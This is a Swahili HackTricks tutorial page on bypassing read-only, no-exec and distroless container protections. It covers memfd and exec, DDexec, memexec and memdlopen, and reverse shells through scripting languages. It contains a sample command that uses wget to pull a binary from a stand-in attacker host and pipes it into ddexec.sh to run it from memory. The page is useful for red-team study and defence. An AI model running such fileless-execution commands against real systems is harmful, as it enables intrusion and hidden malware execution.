# Kupita ulinzi wa FS: soma tu / hakuna-kutekelezwa / Distroless

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Video

Katika video zifuatazo unaweza kupata maelezo zaidi juu ya mbinu zilizotajwa kwenye ukurasa huu:

* [**DEF CON 31 - Kuchunguza Ubadilishaji wa Kumbukumbu ya Linux kwa Upelelezi na Kuepuka**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Uvamizi wa siri na DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Skena ya soma tu / hakuna-kutekelezwa

Inazidi kuwa kawaida kupata mashine za linux zilizounganishwa na **ulinzi wa mfumo wa faili wa soma tu (ro)**, haswa kwenye vyombo. Hii ni kwa sababu kuendesha chombo na mfumo wa faili wa soma tu ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** kwenye `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Hata hivyo, hata ikiwa mfumo wa faili umefungwa kama soma tu, **`/dev/shm`** bado itakuwa inaweza kuandikwa, kwa hivyo sio kweli hatuwezi kuandika chochote kwenye diski. Walakini, saraka hii itakuwa **imefungwa na ulinzi wa hakuna-kutekelezwa**, kwa hivyo ikiwa unapakua faili ya binary hapa, **hutaweza kuitekeleza**.

{% hint style="warning" %}
Kutoka kwa mtazamo wa timu nyekundu, hii inafanya kuwa **ngumu kupakua na kutekeleza** faili za binary ambazo hazipo tayari kwenye mfumo (kama backdoors au watafutaji kama `kubectl`).
{% endhint %}

## Kupita kwa urahisi: Scripts

Tafadhali kumbuka kuwa nilitaja faili za binary, unaweza **kutekeleza skripti yoyote** ikiwa tu msindikaji yupo ndani ya mashine, kama **skripti ya shell** ikiwa `sh` iko au **skripti ya python** ikiwa `python` imefungwa.

Hata hivyo, hii pekee haitoshi kuendesha faili yako ya binary backdoor au zana nyingine za binary ambazo unaweza kuhitaji kuendesha.

## Kupita kwa Kumbukumbu

Ikiwa unataka kutekeleza faili ya binary lakini mfumo wa faili haikuruhusu hilo, njia bora ya kufanya hivyo ni kwa **kuitekeleza kutoka kumbukumbu**, kwani **ulinzi hauna athari huko**.

### Kupita kwa FD + exec syscall

Ikiwa una injini za skripti yenye nguvu ndani ya mashine, kama vile **Python**, **Perl**, au **Ruby**, unaweza kupakua faili ya binary ili kuitekeleza kutoka kumbukumbu, kuichukua na kuweka kwenye maelezo ya faili ya kumbukumbu (`create_memfd` syscall), ambayo hayatalindwa na ulinzi huo na kisha kuita **syscall ya exec** ikionyesha **fd kama faili ya kutekeleza**.

Kwa hili unaweza kutumia mradi [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kumpitisha faili ya binary na itazalisha skripti kwa lugha iliyotajwa na **binary iliyopunguzwa na kubadilishwa kuwa msimbo wa b64** pamoja na maagizo ya **kudecode na kufuta kubadilisha** kwenye **fd** iliyoundwa kwa kuita syscall ya `create_memfd` na wito wa syscall ya **exec** kuikimbia.

{% hint style="warning" %}
Hii haifanyi kazi kwenye lugha zingine za skripti kama PHP au Node kwa sababu hawana njia yoyote ya msingi ya kuita syscalls za moja kwa moja kutoka kwenye skripti, kwa hivyo haiwezekani kuita `create_memfd` kuunda **fd ya kumbukumbu** kuhifadhi faili ya binary.

Zaidi ya hayo, kuunda **fd ya kawaida** na faili katika `/dev/shm` haitafanya kazi, kwani hautaruhusiwa kuikimbia kwa sababu ya **ulinzi wa hakuna-kutekelezwa** utatumika.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni mbinu inayokuwezesha **kurekebisha kumbukumbu ya mchakato wako mwenyewe** kwa kubadilisha **`/proc/self/mem`** yake.

Kwa hivyo, **kudhibiti msimbo wa mkutano** unaotekelezwa na mchakato, unaweza kuandika **shellcode** na "kubadilisha" mchakato ili **kutekeleza msimbo wowote wa aina yoyote**.

{% hint style="success" %}
**DDexec / EverythingExec** itakuruhusu kupakia na **kutekeleza** msimbo wako mwenyewe wa **shellcode** au **binary yoyote** kutoka **kumbukumbu**.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Kwa habari zaidi kuhusu mbinu hii angalia Github au:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni hatua inayofuata ya asili ya DDexec. Ni **DDexec shellcode demonised**, kwa hivyo kila wakati unapotaka **kuendesha binary tofauti** hauitaji kuzindua DDexec tena, unaweza tu kuendesha shellcode ya memexec kupitia mbinu ya DDexec na kisha **kuwasiliana na deamon hii ili kupitisha binaries mpya za kupakia na kuendesha**.

Unaweza kupata mfano wa jinsi ya kutumia **memexec kuendesha binaries kutoka kwa PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Kwa lengo kama la DDexec, mbinu ya [**memdlopen**](https://github.com/arget13/memdlopen) inaruhusu njia rahisi ya kupakia binaries kwenye kumbukumbu ili kuziendesha baadaye. Inaweza hata kuruhusu kupakia binaries na tegemezi.

## Kupitisha Distroless

### Ni nini distroless

Vyombo vya distroless vina **vipengele vichache sana vinavyohitajika kuendesha programu au huduma maalum**, kama maktaba na tegemezi za runtime, lakini havijumuishi vipengele vikubwa kama meneja wa pakiti, shell, au zana za mfumo.

Lengo la vyombo vya distroless ni **kupunguza eneo la shambulio la vyombo** kwa kuondoa vipengele visivyohitajika na kupunguza idadi ya udhaifu ambao unaweza kutumiwa.

### Reverse Shell

Katika chombo cha distroless unaweza **hata usipate `sh` au `bash`** kupata shell ya kawaida. Pia hutapata binaries kama vile `ls`, `whoami`, `id`... kila kitu ambacho kawaida unakimbia kwenye mfumo.

{% hint style="warning" %}
Kwa hivyo, hautaweza kupata **reverse shell** au **kuchunguza** mfumo kama kawaida.
{% endhint %}

Hata hivyo, ikiwa chombo kilichoharibiwa kinatumia mfumo wa flask kwa mfano, basi python imewekwa, na kwa hivyo unaweza kupata **Python reverse shell**. Ikiwa inatumia node, unaweza kupata Node rev shell, na vivyo hivyo na **lugha nyingine za scripting**.

{% hint style="success" %}
Kwa kutumia lugha ya scripting unaweza **kuchunguza mfumo** kwa kutumia uwezo wa lugha hiyo.
{% endhint %}

Ikiwa hakuna ulinzi wa **`read-only/no-exec`**, unaweza kutumia reverse shell yako kudanganya mfumo wa faili na **kuendesha** binaries.

{% hint style="success" %}
Hata hivyo, katika vyombo kama hivi, ulinzi huu kawaida utakuwepo, lakini unaweza kutumia **mbinu za utekelezaji wa kumbukumbu za awali kuzipita**.
{% endhint %}

Unaweza kupata **mifano** ya jinsi ya **kutumia baadhi ya udhaifu wa RCE** kupata **reverse shells** za lugha za scripting na kuendesha binaries kutoka kwenye kumbukumbu katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
